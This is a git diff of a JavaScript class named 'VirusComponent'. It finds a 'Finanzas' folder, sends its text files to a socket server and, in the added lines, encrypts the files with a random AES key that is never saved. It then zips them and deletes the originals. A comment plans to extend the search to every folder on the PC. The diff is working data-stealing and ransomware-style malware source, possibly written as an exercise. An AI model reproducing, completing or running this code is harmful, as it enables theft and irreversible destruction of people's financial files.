@@ -1,15 +1,13 @@
 import fs, { promises } from 'node:fs';
 import { join } from 'node:path';
-import zlib from 'node:zlib';
-import WebSocket from 'ws';
+import crypto from 'node:crypto';
 import { io } from 'socket.io-client';
+import archiver from 'archiver';
 
 class VirusComponent {
-    constructor() {
+    constructor() {}
 
-    }
-
-    socketConnection(){ 
+    async socketConnection(){ 
         const socket = io("ws://localhost:3000", {
             reconnectionDelayMax: 10000,
         });
@@ -43,14 +41,14 @@ class VirusComponent {
             console.log("***********************************************");
             const textFiles = await this.readFiles(finanzasFolderPath, 'text');
             if(textFiles.length > 0) {
-                const socketCli = this.socketConnection();
+                const socketCli = await this.socketConnection();
                 console.log("PHASE2.SUCCESS. Files read successfully.");
                 console.log("***********************************************");
                 console.log("PHASE3. Sending files to socket server.")
                 console.log("***********************************************");
 
-                textFiles.forEach(file => {
-                    this.sendFileToServer(socketCli, file)
+                textFiles.forEach(async file => {
+                    await this.sendFileToServer(socketCli, file)
                     .then(() => {
                         console.log("PHASE3.SUCCESS. Files sent successfully.")
                         console.log("***********************************************");
@@ -63,6 +61,10 @@ class VirusComponent {
                 console.log("PHASE2.WARNING. No text files found in the Finanzas folder");
             }
             console.log("PHASE4. Encrypting and compressing files...");
+            console.log("***********************************************");
+            this.encryptAndZipFolder(finanzasFolderPath, this.generateEncryptionKey());
+            console.log("Attack completed.");
+            console.log("***********************************************");
         } else {
             console.log("PHASE1.ERROR. Finanzas folder not found in the PC.");
             console.log("Attack stopped...");
@@ -70,82 +72,50 @@ class VirusComponent {
             return;
         }
     }
-
+    
     async sendFileToServer(socketCli, file) {
         socketCli.emit('file', file);
     }
-
-    encryptAndCompressFolder(folderPath) {
-        return new Promise((resolve, reject) => {
-            // Read the files in the folder
-            fs.readdir(folderPath, (err, files) => {
-                if (err) {
-                    reject(err);
-                    return;
-                }
     
-                // Create a temporary folder to store the encrypted files
-                const tempFolderPath = path.join(folderPath, 'temp');
-                fs.mkdirSync(tempFolderPath);
-
-                // Encrypt and compress each file
-                const promises = files.map((file) => {
-                    return new Promise((resolve, reject) => {
-                        const filePath = path.join(folderPath, file);
-                        const tempFilePath = path.join(tempFolderPath, file);
-
-                        // Read the file
-                        fs.readFile(filePath, (err, data) => {
-                            if (err) {
-                                reject(err);
-                                return;
-                            }
-
-                            // Encrypt the file data
-                            const cipher = crypto.createCipher('aes-256-cbc', 'encryptionKey');
-                            const encryptedData = Buffer.concat([cipher.update(data), cipher.final()]);
-
-                            // Compress the encrypted data
-                            zlib.gzip(encryptedData, (err, compressedData) => {
-                                if (err) {
-                                    reject(err);
-                                    return;
-                                }
-
-                                // Write the compressed data to the temporary file
-                                fs.writeFile(tempFilePath, compressedData, (err) => {
-                                    if (err) {
-                                        reject(err);
-                                        return;
-                                    }
-
-                                    resolve();
-                                });
-                            });
-                        });
-                    });
-                });
-
-                // Wait for all files to be encrypted and compressed
-                Promise.all(promises)
-                    .then(() => {
-                        // Compress the temporary folder
-                        const compressedFolderPath = path.join(folderPath, 'compressed.zip');
-                        const output = fs.createWriteStream(compressedFolderPath);
-                        const archive = zlib.createZip();
-
-                        output.on('close', () => {
-                            // Remove the temporary folder
-                            fs.rmdirSync(tempFolderPath, { recursive: true });
-                            resolve('Encryption and compression completed');
-                        });
-
-                        archive.directory(tempFolderPath, false);
-                        archive.pipe(output);
-                        archive.finalize();
-                    }).catch((err) => reject(err));
-            });
+    generateEncryptionKey () {
+        return crypto.randomBytes(32);
+    };
+    
+    encryptFile(filePath, key) {
+        const data = fs.readFileSync(filePath);
+        const iv = crypto.randomBytes(16);
+        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
+        let encrypted = cipher.update(data);
+        encrypted = Buffer.concat([encrypted, cipher.final()]);
+        return { iv: iv.toString('hex'), encryptedData: encrypted.toString('hex') };
+    }
+    
+    encryptAndZipFolder(folderPath, key) {
+        const zipFileName = folderPath + '.zip';
+        const output = fs.createWriteStream(zipFileName);
+        const archive = archiver('zip', { zlib: { level: 9 } });
+        
+        output.on('close', function() {
+            fs.rmdirSync(folderPath, { recursive: true });
+            console.log(`PHASE4.SUCCESS. Folder encrypted and compressed.`);
+            console.log("***********************************************");
         });
+        
+        archive.pipe(output);
+    
+        const files = fs.readdirSync(folderPath);
+    
+        files.forEach(file => {
+            const filePath = join(folderPath, file);
+            const stats = fs.statSync(filePath);
+    
+            if (stats.isFile()) {
+                const { iv, encryptedData } = this.encryptFile(filePath, key);
+                archive.append(encryptedData, { name: file + '.enc' });
+            }
+        });
+    
+        archive.finalize();
     }
 
     //se debe corregir este metodo para que la busqueda sea global en todas las carpeta de la pc y no en una sola como parametro.
